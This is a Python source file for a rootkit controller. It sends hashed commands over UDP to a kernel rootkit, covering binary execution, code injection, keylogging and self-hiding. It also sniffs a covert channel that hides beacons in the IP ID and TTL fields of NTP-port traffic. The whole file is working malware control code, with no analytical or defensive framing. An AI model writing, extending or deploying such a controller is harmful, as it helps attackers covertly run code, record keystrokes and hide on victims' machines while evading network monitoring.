# A controller for the rootkit
import socket
import threading
from scapy.all import sniff, IP, UDP

# Payload mapping: number → padded string (must be exactly PAYLOAD_LEN in kernel)
payload_map = {
    "1": "rootkit_binary_exec",
    "2": "rootkit_injector___",
    "3": "rootkit_injector_ex",
    "4": "rootkit_keylog_____",
    "5": "rootkit_keylog_ex__",
    "6": "rootkit_hide_______",
    "7": "rootkit_rec_signal_"
}

# Config
TARGET_UDP_HOST = '127.0.0.1'
TARGET_UDP_PORT = 9000

def fnv1a_hash(data):
    hash = 0x811c9dc5
    fnv_prime = 0x01000193
    for b in data.encode():
        hash ^= b
        hash = (hash * fnv_prime) & 0xffffffff
    return hash

def print_hashes(): 
    print("[*] Payload string -> FNV-1a hash:")
    for payload in payload_map:
        h = fnv1a_hash(payload_map[payload])
        print(f"  {payload}: {payload_map[payload]} -> {hex(h)}")

def handler(pkt):
    if IP in pkt:
        ip_header = pkt[IP]
        print(f"[+] IP Header: {ip_header.summary()} from {ip_header.src} to {ip_header.dst}")
        try:
            id_char = chr(ip_header.id)
            ttl_char = chr(ip_header.ttl)
            print(f"[+] Covert NTP beacon: {id_char}{ttl_char} from {ip_header.src}")
        except:
            print("[-] Could not decode chars")

def start_sniffer():
    print("[*] Sniffing for covert NTP beacons (UDP port 123)...")
    sniff(filter="udp port 123", iface="lo", prn=handler)

def send_payload(option):
    payload_hash = fnv1a_hash(payload_map[option])
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload_hash.to_bytes(4, 'big'), (TARGET_UDP_HOST, TARGET_UDP_PORT))
        s.close()
        print(f"[+] Sent payload '{payload_map[option]}' as hash {hex(payload_hash)}")
    except Exception as e:
        print(f"[-] Failed to send payload: {e}")

def print_menu():
    print("\n==== Rootkit Controller Menu ====")
    for key, val in payload_map.items():
        print(f"  {key}: {val}")
    print("  sniff  : Start NTP covert channel sniffer")
    print("  hashes : Print payload hashes")
    print("  exit   : Quit")
    print("==================================")

if __name__ == "__main__":
    sniffer_started = False
    while True:
        print_menu()
        choice = input("Enter command: ").strip()

        if choice == "exit":
            print("[*] Exiting...")
            break
        elif choice == "sniff":
            if not sniffer_started:
                threading.Thread(target=start_sniffer, daemon=True).start()
                sniffer_started = True
            else:
                print("[!] Sniffer already running.")
        elif choice == "hashes":
            print_hashes()
        elif choice == "7":
            print("[-] Not meant to be used, for userspace helpers only")
            continue
        elif choice in payload_map:
            send_payload(choice)
        else:
            print("[-] Invalid option.")
